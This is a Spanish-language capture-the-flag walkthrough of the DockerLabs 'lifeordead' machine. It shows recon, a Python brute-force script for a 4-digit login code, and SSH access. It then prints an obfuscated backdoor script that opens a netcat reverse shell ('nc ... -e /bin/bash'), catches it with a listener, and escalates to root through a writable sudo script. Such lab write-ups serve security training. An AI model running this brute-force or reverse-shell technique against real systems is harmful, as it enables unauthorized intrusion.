![Screenshot](/hard/lifeordead/Images/machine.png)

Dificultad: **difícil**

Creado por: **d1se0**

# Pasos para comprometer la máquina 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#explotacion)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---

En primer lugar, nos aseguramos de que la máquina esté activa, lo cual podemos hacer con el comando **ping**

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.222 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.154 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.094 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2043ms
rtt min/avg/max/mdev = 0.094/0.156/0.222/0.052 ms
```

Ahora podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Podemos comenzar nuestro reconocimiento con **nmap** para ver qué puertos están abiertos en el objetivo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2 -oG ports
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 00:25 -05
Initiating ARP Ping Scan at 00:25
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:25, 0.18s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:25
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:25, 3.88s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000030s latency).
Scanned at 2025-12-12 00:25:51 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le indicamos a nmap que escanee todos los puertos, desde el puerto 1 hasta el puerto 65.535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, lo cual es útil porque en algunos casos puede ser muy lento.

**-sS** <- Con este argumento nmap realizará un escaneo de tipo "stealth", lo que significa que no se completará el handshake de tres vías, y además hace que el escaneo sea ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo que el escaneo sea aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de hosts, lo que significa que tratará a la máquina como activa y comenzará inmediatamente el escaneo.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras continúa el escaneo, lo que significa que si nmap descubre un puerto abierto, lo reportará inmediatamente mientras continúa.

**--open** <- Con este argumento le decimos a nmap que solo filtre los puertos abiertos.

Cuando el escaneo finaliza, podemos ver que hay 2 puertos abiertos:

- Puerto 22 (ssh / shell seguro)
- Puerto 80 (http / protocolo de transferencia de hipertexto)

Pero necesitamos saber más sobre estos 2 puertos, como qué servicios están utilizando.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,80** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará la versión de cada puerto para detectar posibles vulnerabilidades en sistemas no actualizados, y también realizará una exploración con algunos scripts que ejecuta nmap para obtener más información sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap proporciona y la guardamos como un archivo XML.

**--stats-every=1m** <- Con este argumento recibimos estadísticas del escaneo cada 1 minuto, esto puede tener minutos (m) y segundos (s)

Después de que el escaneo termine, obtenemos la salida en un archivo XML, lo hacemos para crear una página HTML para ver la información de forma más fácil y agradable a la vista.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo XML a un archivo HTML, ahora vamos a abrirlo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/hard/lifeordead/Images/image1.png)

Es mucho más limpio y legible, y podemos ver que el puerto 80 es un sitio web, vamos a echarle un vistazo.

![Screenshot](/hard/lifeordead/Images/image2.png)

Es un sitio web predeterminado, podemos intentar ver el código fuente, a veces puede ocultar contenido dentro.

```css
div.page_header {
height: 180px;
width: 100%;

background-color: #F5F6F7;
background-color: UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU;
}
```

Si notamos el valor del background-color, es extraño, su valor está codificado en base64, podemos decodificarlo y ver qué hay dentro.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ echo "UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU" | base64 -d
PASSWORDADMINSUPERSECRET
```

Podemos ver esta contraseña, pero también hay algo más en el código fuente del sitio web.

```html
<div class="validator" hidden="lifeordead.dl">
```

Esto es un hosting virtual, vamos a cambiar nuestro archivo **/etc/hosts** para guardar este dominio.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ head -n 1 /etc/hosts 
172.17.0.2      lifeordead.dl
```

Bien, ahora vamos a abrir nuestro navegador para abrir este dominio.

![Screenshot](/hard/lifeordead/Images/image3.png)

Podemos ver una página de inicio de sesión, pero recordemos que obtuvimos la contraseña del usuario admin antes, vamos a ver si funciona.

![Screenshot](/hard/lifeordead/Images/image4.png)

Y podemos ver esto, parece que necesitamos un número de 4 dígitos para ingresar, pero antes de hacer un intento de fuerza bruta, podemos echar un vistazo rápido al código fuente de la página.

Y podemos ver esto:

```
<!--dimer-->
```

Es un comentario, probablemente es un usuario o algo así.

Bien, vamos a interceptar la solicitud del sitio web y ver cómo se envía los datos.

```python
POST /pageadmincodeloginvalidation.php HTTP/1.1
Host: lifeordead.dl
Content-Length: 139
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryq8lPdmdy189xvAuQ
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Origin: http://lifeordead.dl
Referer: http://lifeordead.dl/pageadmincodelogin.html
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=u1tcgtrhjo8rb0lu28bmjnc6e1
Connection: keep-alive

------WebKitFormBoundaryq8lPdmdy189xvAuQ
Content-Disposition: form-data; name="code"

1234
------WebKitFormBoundaryq8lPdmdy189xvAuQ--
```

Y podemos ver que está haciendo una solicitud POST a **/pageadmincodeloginvalidation.php** y enviando el código como un tipo WebKitFormBoundary, esto es importante saber para hacer nuestro exploit.

Y vamos a interceptar también la respuesta del sitio web.

Recibimos esto:

```python
HTTP/1.1 200 OK
Date: Fri, 12 Dec 2025 22:32:09 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 50
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"failed","attempts":9,"remainingTime":0}
```

Y podemos ver que los datos de respuesta son de tipo json, ahora vamos a ver qué pasa si agotamos los intentos.

```python
HTTP/1.1 200 OK
Date: Fri, 12 Dec 2025 22:36:36 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"blocked","remainingTime":23,"attempts":10}
```

Podemos ver que el estado cambia a **"blocked"**, por lo tanto, con toda esta información podemos intentar hacer nuestro propio exploit para hacer un intento de fuerza bruta en el sitio web para encontrar cuál es el código correcto.

Vamos a hacerlo con python.

---
# Explotación

Hice este script en python para forzar el número de código desde 0000 hasta 9999:

```python
from pwn import *
from requests_toolbelt import MultipartEncoder
import requests
import random
import string
import json

target = "http://lifeordead.dl/pageadmincodeloginvalidation.php"

def send_request(num):
        fields = {
                "code": f"{num:04d}"
        }

        bound = "----WebKitFormBoundary" + "".join(random.sample(string.ascii_letters + string.digits, 16))
        payload = MultipartEncoder(fields=fields, boundary=bound)

        heads = {
                "Content-Type": payload.content_type
        }

        response = requests.post(url=target, headers=heads, data=payload)
        data = json.loads(response.text)

        return data["status"]


with log.progress("Forzando el número de código...") as bar:
        for num in range(10000):

                bar.status(f"Intentando con el código: {num:04d}")

                status = send_request(num)

                if status != "failed" and status != "blocked":
                        bar.success(f"¡PWNED! El número de código es: {num:04d}")
                        break

        bar.failure("No se puede obtener el número de código T_T")

```

Y estamos aprovechando que el sitio web no requiere una cookie para verificar si el tráfico es legítimo.

Así que después de un par de segundos obtenemos el código para iniciar sesión!

```
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ python3 exploit.py 
[+] Forzando el número de código...: ¡PWNED! El número de código es: [REDACTED]
```

Entonces, después de que descubrimos el código, vamos a verificar si funciona.

![Screenshot](/hard/lifeordead/Images/image5.png)

Así que tenemos la contraseña para iniciar sesión en algún lugar, vamos a ver si con ssh podemos iniciar sesión como el usuario **dimer** si recordamos antes y con esta contraseña.

```
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ ssh dimer@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:ndOnZVaYzMdjJB/SAr+N1b0VbsZjgS+/hqKHCviYNyo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
dimer@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.17.10+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dimer@dockerlabs:~$
```

¡Y estamos dentro!

---
# Escalada de privilegios

Antes de hacer la escalada de privilegios, necesitamos hacer un movimiento lateral antes de poder aumentar nuestros privilegios.

Vemos que tenemos privilegios con **SUDOERS**

```
dimer@dockerlabs:~$ sudo -l
Matching Defaults entries for dimer on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dimer may run the following commands on dockerlabs:
    (bilter : bilter) NOPASSWD: /opt/life.sh
```

Podemos ver que podemos ejecutar este script de bash como el usuario **bilter**

Vamos a echar un vistazo al código.

```python
#!/bin/bash

set +m

v1=$((0xCAFEBABE ^ 0xAC1100BA))
v2=$((0xDEADBEEF ^ 0x17B4))

a=$((v1 ^ 0xCAFEBABE))
b=$((v2 ^ 0xDEADBEEF))

c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))

d=$((b))

e="nc"
f="-e"
g=$c
h=$d

$e $g $h $f /bin/bash &>/dev/null &
```

Parece que está obfuscado y es difícil de leer. Pero podemos ver que este script usa netcat y también ejecuta **bash** como una puerta trasera, podemos intentar ejecutarlo y ver qué puertos están abiertos dentro de la máquina.

En este sistema no tiene el comando **ss** pero sí tiene **netstat**.

Si ejecutamos el script de bash y luego rápidamente ejecutamos **netstat** para ver qué está pasando.

```
dimer@dockerlabs:~$ sudo -u bilter /opt/life.sh
dimer@dockerlabs:~$ netstat -aon
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      1 172.17.0.2:52710        172.17.0.186:6068       SYN_SENT    on (0.26/0/0)
tcp        0    256 172.17.0.2:22           172.17.0.1:53496        ESTABLISHED on (0.21/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     81416    
unix  2      [ ]         STREAM     CONNECTED     82011    
unix  3      [ ]         STREAM     CONNECTED     81417
```

Podemos ver que la máquina local envía una solicitud a la dirección IP **172.17.0.186** al puerto **6068** si recordamos lo que hace el script, establece una conexión con **netcat** y ejecuta **bash**, en resumen, haciendo una shell inversa.

Por lo tanto, necesitamos hacer que esta dirección IP reciba la conexión.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ sudo ip addr add 172.17.0.186/16 dev docker0
```

Así que creamos en nuestra propia máquina de ataque esta dirección IP para recibir la conexión.

Y también pongámonos en modo escucha para recibir cualquier conexión con **netcat**

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ nc -lvp 6068 -s 172.17.0.186
172.17.0.186: inverse host lookup failed: Unknown host
listening on [172.17.0.186] 6068 ...
```

Después de que estemos en modo escucha, vamos a ejecutar el script de bash para recibir la shell.

```
dimer@dockerlabs:~$ sudo -u bilter /opt/life.sh
```

Así que cuando ejecutamos esto recibimos una shell como el usuario **bilter**

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ nc -lvp 6068 -s 172.17.0.186
172.17.0.186: inverse host lookup failed: Unknown host
listening on [172.17.0.186] 6068 ...
connect to [172.17.0.186] from lifeordead.dl [172.17.0.2] 36374
whoami
bilter
```

Bien, voy a hacer que esta sea una mejor shell para trabajar.

En primer lugar, hacemos esto:

```
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bilter@dockerlabs:/home/dimer$
```

Este comando crea una nueva sesión de bash con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un registro, pero con la ruta /dev/null, hacemos que ese registro no pueda grabar comandos, y **-c bash** hace que script ejecute la shell con bash.

Lo hacemos porque queremos usar CTRL + C y más funciones de bash.

Cuando ejecutamos esto, suspendemos nuestra shell inversa por un momento.

Luego ejecutamos el siguiente comando en nuestra máquina de ataque:

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de entrada y salida sean crudos.

**-echo** <- Con esto estamos haciendo que si ejecutamos un comando no se imprima de nuevo en la salida.

**; fg** <- Y con esto reanudamos nuestra shell inversa de nuevo.

Cuando ejecutamos este comando, restablecemos el xterm:

```
reset xterm
```

Esto va a restablecer la terminal.

Si queremos limpiar nuestra terminal no podemos porque el term será diferente del xterm, que tiene esta función. Podemos hacerlo de la siguiente manera para poder limpiar nuestra pantalla si se pone feo:

```
bilter@dockerlabs:/home/dimer$ export TERM=xterm
```

Y una última cosa, si notamos que la pantalla de la terminal es muy pequeña!

Podemos ajustar esto para que sea más grande con el siguiente comando:

```
bilter@dockerlabs:/home/dimer$ stty rows {num} columns {num}
```

Y finalmente se ve mucho mejor!

Después de hacer esto, nuevamente tenemos privilegios de **SUDOER**.

```
bilter@dockerlabs:~$ sudo -l
Matching Defaults entries for bilter on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bilter may run the following commands on dockerlabs:
    (ALL : ALL) NOPASSWD: /usr/local/bin/dead.sh
```

Podemos ejecutar este **script** de bash como **cualquier** usuario, incluso con el usuario **root**, pero si miramos los permisos de este script bash.

```
bilter@dockerlabs:~$ ls -l /usr/local/bin/dead.sh
--wx--x--x 1 root root 182 Jan 20  2025 /usr/local/bin/dead.sh
```

Solo podemos ejecutarlo, ni siquiera verlo!

Así que veamos qué pasa.

```
bilter@dockerlabs:~$ sudo /usr/local/bin/dead.sh
161
```

Solo la salida es este número **161**, y nada más hace este script, no cambia nada en el sistema.

Después de una larga búsqueda, podemos encontrar algo interesante, si escaneamos este número como un puerto con nmap.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ nmap -sU -p161 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 20:08 -05
Nmap scan report for lifeordead.dl (172.17.0.2)
Host is up (0.0034s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux dockerlabs 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64
|_  System uptime: 5m47.35s (34735 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 7f3cbe5245328e6700000000
|   snmpEngineBoots: 12
|_  snmpEngineTime: 5m47s
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: dockerlabs

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
```

Podemos ver que este puerto está abierto, por lo tanto, podemos enumerar un poco este puerto con **snmpwalk**

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ snmpwalk -c public -v 1 172.17.0.2
iso.3.6.1.2.1.1.1.0 = STRING: "Linux dockerlabs 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (118699) 0:19:46.99
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@lifeordead.dl>"
iso.3.6.1.2.1.1.5.0 = STRING: "dockerlabs"
iso.3.6.1.2.1.1.6.0 = STRING: "This port must be disabled aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw="
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
```

Así que podemos notar otro mensaje aquí codificado en base64, vamos a decodificarlo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ echo "aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw=" | base64 -d
[REDACTED]
```

Así que una vez que tengamos la contraseña, vamos a iniciar sesión como el usuario **purter**

```
dimer@dockerlabs:~$ su purter
Password: 
purter@dockerlabs:/home/dimer$
```

Y nuevamente obtenemos otro privilegio de **SUDOER**.

```
purter@dockerlabs:~$ sudo -l
Matching Defaults entries for purter on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User purter may run the following commands on dockerlabs:
    (ALL : ALL) NOPASSWD: /home/purter/.script.sh
```

Pero podemos eliminar este script de bash porque estamos en nuestro directorio personal, así que vamos a crear nuestro propio script de bash para recibir una shell como el usuario **root** y así poder escalar nuestros privilegios.

Así que este es nuestro nuevo script de bash:

```bash
purter@dockerlabs:~$ cat .script.sh 
#!/bin/bash

bash
```

Una vez que guardemos nuestro propio script de bash, le damos permisos para ejecutarlo con **chmod**

```
purter@dockerlabs:~$ chmod +x .script.sh
```

Después de todo esto, podemos recibir una shell como el usuario root.

Ahora vamos a ejecutarlo.

```
purter@dockerlabs:~$ sudo /home/purter/.script.sh 
root@dockerlabs:/home/purter#
```

Así que ahora somos root, podemos ver la bandera.

```
root@dockerlabs:/home/purter# cat /root/root.txt 
e04292d1067e92530c22e87ebfc87d28
```

***...pwned..!***
